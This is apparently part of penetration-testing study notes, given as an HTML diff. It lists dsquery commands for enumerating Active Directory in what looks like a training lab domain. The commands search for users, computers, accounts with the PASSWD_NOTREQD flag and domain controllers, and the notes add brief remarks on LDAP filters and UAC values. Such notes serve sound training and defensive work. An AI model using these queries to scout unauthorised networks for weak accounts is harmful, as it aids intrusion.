+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>Dsquery user</strong> &ndash; user search</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>Dsquery computer</strong> &ndash; computer search</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>Dsquery * &quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</strong> &ndash; wildcard search</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>dsquery * -filter &quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&quot; -attr distinguishedName userAccountControl -&nbsp;</strong>Users With Specific Attributes Set (PASSWD_NOTREQD)</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><strong>dsquery * -filter &quot;(userAccountControl:1.2.840.113556.1.4.803:=8192)&quot; -limit 5 -attr sAMAccountName &ndash;&nbsp;</strong>searching for domain controllers</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>&nbsp;</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'><em><span style="font-size:29px;line-height:107%;">LDAP Filtering</span></em></p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>UAC values 1,2,32,64,128,512,2048,4096,8192,65536,524288,1048576 all mean something different</p>
+<p style='margin-top:0cm;margin-right:0cm;margin-bottom:8.0pt;margin-left:0cm;line-height:107%;font-size:15px;font-family:"Calibri",sans-serif;'>OID match strings / logical operators</p>
